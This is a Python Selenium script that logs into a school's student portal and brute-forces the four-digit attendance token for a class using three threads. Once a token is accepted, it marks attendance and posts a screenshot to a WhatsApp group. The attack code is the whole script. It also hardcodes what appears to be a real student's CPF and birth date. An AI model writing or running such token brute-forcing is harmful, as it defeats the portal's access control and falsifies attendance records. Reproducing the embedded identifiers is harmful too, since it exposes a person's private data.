import time
import random
import threading
import pyautogui
import os

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# Variável global para parar as threads
token_encontrado = False

# Conjunto compartilhado para armazenar tokens já testados
testados = set()
lock = threading.Lock()  # Lock para sincronização entre threads

def verificar_token(cpf, data_nascimento):
    global token_encontrado

    # Configura o driver do Selenium
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service)

    try:
        # Login
        driver.get("https://www.infinityschool.app/area/")
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "projectFilePath")))
        time.sleep(2)

        # Insira seu CPF
        campo_cpf = driver.find_element(By.NAME, "projectFilePath")
        campo_cpf.send_keys(cpf)

        # Insira a data de nascimento
        campo_nascimento = driver.find_element(By.ID, "data_nascimento")
        campo_nascimento.send_keys(data_nascimento)

        # Clica em acessar
        botao_acessar = driver.find_element(By.XPATH, "//button[contains(text(),'Acessar')]")
        botao_acessar.click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/handle_data"))
        print("Login bem-sucedido!")

        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)

        # Clica no botão "Marcar presença"
        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Marcar presença')]"))).click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/marcar_presenca"))
        print("Clicando no botao de marcar presença")

        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)

      
        # Clica no botão "Presença aula super módulos"
        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Presença aula super módulos')]"))).click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/marcar_presenca_sm"))
        print("Entrando para coloar o token de superMódulo")


        # Rolagem de tela após selecionar a presença
        driver.execute_script("window.scrollBy(0, 200);")
        time.sleep(2)

        # Quarta parte: Testar combinações de token até que "Token válido!" apareça
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "token")))

        while not token_encontrado:  # Continua o loop até encontrar um token válido
            token = f"{random.randint(0, 9999):04d}"  # Gera um número aleatório de 4 dígitos

            # Uso do lock para acessar o conjunto compartilhado
            with lock:
                if token in testados:  # Verifica se o token já foi testado
                    continue  # Se já foi testado, gera um novo token
                testados.add(token)  # Adiciona o token ao conjunto de testados

            campo_token = driver.find_element(By.ID, "token")
            campo_token.clear()
            campo_token.send_keys(token)
            campo_token.send_keys(Keys.RETURN)

            time.sleep(0.0001)  # Espera 100ms para a validação

            # Verifica a mensagem de validação
            try:
                mensagem = driver.find_element(By.ID, "validation-message").text
                if "token válido!" in mensagem.lower():
                    print(f"Token Válido: {token}")
                    token_encontrado = True  # Atualiza a variável para encerrar todas as threads
                    
                    # Espera 5 segundos antes de clicar no botão "Concluir presença"
                    time.sleep(35)

                    # Clica no botão "Concluir presença"
                    botao_concluir = driver.find_element(By.ID, "submit-button")
                    botao_concluir.click()
                    print("Presença geral concluída!")

                    # Espera 15 segundos antes de encerrar
                    time.sleep(5)


                    #COLOCAR O CODIGO AQUI
                    def capturar_tela():
                        # Clica no botão PrtSc para abrir a ferramenta de captura de tela
                        print("Capturando tela...")
                        pyautogui.press('prtsc')  
                        time.sleep(1)
                        
                        # Pressiona Tab 4 vezes para selecionar "Capturar tela cheia"
                        for _ in range(4):
                            pyautogui.press('tab')
                            time.sleep(0.5)
                        
                        # Pressiona Enter para confirmar e capturar a tela inteira
                        pyautogui.press('enter')
                        time.sleep(2)  # Aguarda a captura ser concluída

                    def abrir_whatsapp():
                        # Caminho para o atalho do WhatsApp Desktop
                        caminho_whatsapp = r"C:\Users\vitor\OneDrive\Área de Trabalho\WhatsApp.lnk"
                        print("Abrindo WhatsApp Desktop...")
                        os.startfile(caminho_whatsapp)
                        time.sleep(5)  # Espera o aplicativo abrir completamente

                    def localizar_grupo(grupo_nome):
                        # Abre a busca no WhatsApp e procura pelo grupo
                        print(f"Procurando o grupo '{grupo_nome}'...")
                        pyautogui.hotkey('ctrl', 'f')
                        time.sleep(2)
                        pyautogui.write(grupo_nome)  # Digita o nome do grupo
                        time.sleep(2)
                        
                        # Pressiona Tab para selecionar o grupo e Enter para entrar
                        pyautogui.press('tab')
                        time.sleep(1)
                        pyautogui.press('enter')
                        time.sleep(3)  # Espera o grupo abrir

                    # Mensagem a ser enviada
                    mensagem = "Aula do supermódulo"

                    for linha in mensagem.split('\n'):  # Quebra a mensagem por linha, caso tenha múltiplas linhas
                        pyautogui.write(linha)  # Escreve a linha
                        pyautogui.hotkey('shift', 'enter')  # Desce a linha com shift+enter para continuar na mesma mensagem
                    time.sleep(2)  # Espera um pouco para garantir que a mensagem foi escrita
                    pyautogui.press('enter')  # Envia a mensagem
                    print("Mensagem 'Aula do supermódulo' enviada!")
                    
                    def enviar_imagem():
                        # Cola e envia a captura de tela para o grupo
                        print("Enviando a captura de tela...")
                        pyautogui.hotkey('ctrl', 'v')  # Cola a imagem no chat do grupo
                        time.sleep(2)  # Espera a imagem carregar no chat
                        pyautogui.press('enter')  # Envia a imagem
                        print("Imagem enviada com sucesso!")

                    # Executa o processo completo
                    capturar_tela()  # Captura a tela
                    abrir_whatsapp()  # Abre o WhatsApp Desktop
                    localizar_grupo("Aulas infinity")  # Localiza o grupo no WhatsApp
                    enviar_imagem()  # Envia a captura de tela para o grupo



                    driver.quit()  # Encerra o navegador
                    return  # Encerra a função
            except:
                pass  # Se a mensagem não for encontrada, continua o loop

    finally:
        # Pausa e aguarda o pressionar de Enter para encerrar o programa
        if not token_encontrado:
            driver.quit()  # Encerra o navegador
            print("Não achou token")
            

threads = []

for _ in range(3):
    thread = threading.Thread(target=verificar_token, args=(12055250680, 21102004))#COLOCAR DADOS DA CONTA AQUI
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

